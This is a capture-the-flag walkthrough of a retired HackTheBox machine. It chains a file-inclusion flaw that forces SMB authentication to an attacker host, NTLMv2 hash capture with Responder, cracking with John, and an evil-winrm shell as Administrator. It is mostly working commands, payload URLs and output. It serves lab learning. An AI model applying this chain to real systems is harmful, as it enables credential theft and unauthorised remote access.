# HackTheBox — Responder Write-up

| | |
|---|---|
| **Platform** | HackTheBox (Starting Point) |
| **Machine** | Responder |
| **OS** | Windows |
| **Focus** | LFI / remote file inclusion, NTLMv2 hash capture with Responder, hash cracking, WinRM access |

> Educational write-up of a retired HackTheBox lab machine. Substitute your own target IP and tun0 address where shown.

---

## 1. Reconnaissance

Enumerate the web server and map the host. A quick vuln scan is useful for orientation:

```bash
nikto -host http://<target-ip>
```

> **Nikto** is an open-source web server scanner that checks for thousands of dangerous files, outdated software, and misconfigurations.

The site has a page parameter of the form:

```
/index.php?page=index.html
```

A `page` parameter that loads files is a classic **file inclusion** indicator.

---

## 2. Confirming File Inclusion

The `page` parameter includes files without sanitization. Beyond local files, it will also resolve a **UNC path to a remote SMB share** — which is the key behavior here. Pointing it at your own machine forces the target to authenticate to you over SMB:

```
/index.php?page=//<attacker-ip>/somefile
```

---

## 3. Capturing the NTLMv2 Hash with Responder

Start **Responder** on the VPN interface so it answers the incoming SMB authentication and captures the credentials:

```bash
sudo responder -I tun0
```

> **Responder** poisons LLMNR/NBT-NS/MDNS and runs rogue SMB/HTTP servers to capture authentication. Here it simply catches the SMB auth the target sends when it tries to fetch the remote file.

Now trigger the inclusion by visiting:

```
http://<target-ip>/index.php?page=//<attacker-ip>/somefile
```

Responder logs the target's NTLMv2 challenge/response:

```
[SMB] NTLMv2-SSP Client   : <target-ip>
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:<server-challenge>:<response>:<blob...>
```

Save the full hash line to a file:

```bash
echo 'Administrator::RESPONDER:<server-challenge>:<response>:<blob...>' > hash.txt
```

---

## 4. Cracking the Hash

Crack the NetNTLMv2 hash with John against `rockyou`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
badminton        (Administrator)
1g 0:00:00:00 DONE ...
```

The Administrator password is recovered: `badminton`.

(To re-display cracked results: `john --show --format=netntlmv2 hash.txt`.)

---

## 5. Foothold via WinRM

Windows Remote Management listens on TCP **5985**. With valid credentials, connect using **evil-winrm**:

```bash
evil-winrm -i <target-ip> -u Administrator -p badminton
```

> **WinRM** allows remote management of Windows hosts; **evil-winrm** is the go-to tool for getting an interactive shell once you hold valid credentials.

From the shell, the flag lives under the relevant user's directory (e.g. `C:\Users\mike\Desktop\`):

```powershell
type C:\Users\mike\Desktop\flag.txt
```


